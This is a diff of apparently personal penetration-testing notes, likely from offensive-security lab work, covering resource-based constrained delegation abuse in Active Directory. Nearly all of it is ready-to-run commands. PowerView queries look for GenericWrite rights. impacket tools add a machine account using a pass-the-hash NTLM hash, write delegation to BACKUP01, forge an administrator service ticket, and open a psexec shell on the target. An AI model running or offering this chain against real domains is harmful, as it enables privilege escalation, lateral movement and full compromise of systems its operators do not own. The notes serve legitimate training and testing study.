@@ -244,9 +244,7 @@ nslookup appsrv01
 * Backend service controls which frontend services can delegate on behalf of users
 * Attack against RBCD needs to happen from a computer account or a service account with a SPN
 
-[Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)
-
-* Find which computers we can modify using GenericWrite permissions
+- Find which computers we can modify using GenericWrite permissions
   *   ```powershell
       Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
       ```
@@ -256,29 +254,34 @@ nslookup appsrv01
     * ```powershell
       Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
       ```
-* Add a New Computer Account (myComputer$) to the Domain
+- Add a New Computer Account (myComputer$) to the Domain
   *   ```powershell
       impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
       # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' ops.comply.com/FILE06$ -hashes :c81c9...
       ```
 
 
-* Configure RBCD on the Target Machine (BACKUP01$)
+- Configure RBCD on the Target Machine (BACKUP01$)
   *   ```powershell
       impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
       ```
 
 
-* Obtain a Service Ticket (ST) as Administrator
+- Obtain a Service Ticket (ST) as Administrator
   *   ```powershell
       impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
       ```
 
 
-* Execute Commands as Administrator
-  * ```powershell
-    impacket-psexec administrator@backup01.corp.com -k -no-pass
-    ```
+- Execute Commands as Administrator
+  *   <pre class="language-powershell"><code class="lang-powershell"><strong>mv Administrator@cifs_backup01.corp.com@CORP.COM.ccache administrator.ccache
+      </strong>export KRB5CCNAME=/home/kali/Documents/offsec/challenges/7/administrator.ccache
+      impacket-psexec administrator@backup01.corp.com -k -no-pass
+      </code></pre>
+
+
+
+[Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)
 
 </details>
 
